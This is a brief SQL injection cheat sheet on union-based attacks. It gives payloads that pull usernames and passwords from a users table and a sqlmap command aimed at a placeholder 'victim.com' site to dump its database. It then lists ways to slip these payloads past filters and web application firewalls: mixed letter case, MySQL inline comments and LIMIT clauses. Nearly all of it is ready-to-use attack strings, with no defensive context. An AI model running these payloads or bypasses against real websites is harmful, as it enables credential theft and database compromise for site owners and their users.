Union-Based SQL Injection

Idea: Inject a UNION SELECT to combine attackerâ€™s query with original query and dump data directly.

Manual Payload Example:

' UNION SELECT null, username, password FROM users--


If the columns align correctly, this will return usernames & passwords in the webpage.

sqlmap Command:

sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=U --dump


----------------------------------------------------------------------------------------

Union-Based SQLi

Normal Payload:

' UNION SELECT null,username,password FROM users--


Bypass Tricks:

Case variation:

UnIoN SeLeCt null,username,password FrOm users--


Use /*! ... */ MySQL inline comments (executes inside MySQL but bypasses filters):

' /*!UNION*/ /*!SELECT*/ null,username,password /*!FROM*/ users--


Add LIMIT to avoid WAF triggers:

' UNION SELECT username,password,null FROM users LIMIT 1--
